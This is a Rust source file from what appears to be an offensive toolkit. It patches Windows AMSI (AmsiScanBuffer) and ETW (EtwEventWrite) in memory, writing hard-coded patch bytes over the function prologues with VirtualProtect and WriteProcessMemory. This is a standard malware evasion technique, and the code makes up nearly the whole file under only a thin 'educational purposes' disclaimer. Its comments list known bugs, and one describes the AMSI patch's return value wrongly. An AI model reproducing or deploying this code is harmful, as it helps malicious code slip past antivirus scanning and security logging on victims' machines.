/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// stealth/stomp.rs — in-process AMSI and ETW prologue patches.
//
// Real user-mode WriteProcessMemory of well-known patch bytes.
//
// BROKEN:
//   - GetCurrentProcess imported from handleapi; it lives in processthreadsapi
//     (likely compile error).
//   - stomp_module("amsi.dll") fails if the DLL is not already loaded.
//   - Only two DLL names are handled; anything else returns false immediately.

use log::{info, error};
use winapi::um::memoryapi::{VirtualProtect, WriteProcessMemory};
use winapi::um::handleapi::GetCurrentProcess; // BROKEN: should be processthreadsapi
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::shared::minwindef::DWORD;
use std::ffi::CString;
use std::ptr;

/// Patch bytes that disable AmsiScanBuffer (ret 0 immediately).
/// 0xB8 0x57 0x00 0x07 0x80 0xC3  →  mov eax, 0x80070057 ; ret
pub const AMSI_SCAN_BUFFER_PATCH: &[u8] = &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

/// Patch bytes that neutralise EtwEventWrite (xor eax, eax ; ret).
pub const ETW_PATCH: &[u8] = &[0x33, 0xC0, 0xC3];

/// Patch a function by overwriting its prologue in the loaded DLL image.
/// `dll`  — module name already loaded in the process (e.g. "amsi.dll").
/// `func` — chosen internally from dll name (not a parameter — naming mismatch).
/// `patch`— replacement bytes to write at the function's first address.
pub fn stomp_module(dll: &str, patch: &[u8]) -> bool {
    info!("Stomping {} with {} patch bytes…", dll, patch.len());

    let target_fn = if dll == "amsi.dll" { "AmsiScanBuffer" }
                    else if dll == "ntdll.dll" { "EtwEventWrite" }
                    else { return false; };

    unsafe {
        let dll_cstr  = CString::new(dll).unwrap();
        let func_cstr = CString::new(target_fn).unwrap();

        let h_mod  = GetModuleHandleA(dll_cstr.as_ptr());
        if h_mod.is_null() { error!("Module not loaded: {}", dll); return false; }

        let proc_addr = GetProcAddress(h_mod, func_cstr.as_ptr());
        if proc_addr.is_null() { error!("Export not found: {} in {}", target_fn, dll); return false; }

        // Make the target page writable.
        let mut old_protect: DWORD = 0;
        if VirtualProtect(proc_addr as *mut _, patch.len(), 0x40, &mut old_protect) == 0 {
            error!("VirtualProtect failed for {}", target_fn);
            return false;
        }

        // Write patch bytes.
        let mut written = 0usize;
        let ok = WriteProcessMemory(
            GetCurrentProcess(),
            proc_addr as *mut _,
            patch.as_ptr() as *const _,
            patch.len(),
            &mut written,
        );

        // Restore original protection.
        let mut dummy: DWORD = 0;
        VirtualProtect(proc_addr as *mut _, patch.len(), old_protect, &mut dummy);

        if ok == 0 {
            error!("WriteProcessMemory failed for {}", target_fn);
            return false;
        }

        info!("Patched {} in {} ({} bytes written)", target_fn, dll, written);
        true
    }
}

/// Patch EtwEventWrite in ntdll to suppress ETW event emission.
pub fn patch_etw() -> bool {
    stomp_module("ntdll.dll", ETW_PATCH)
}
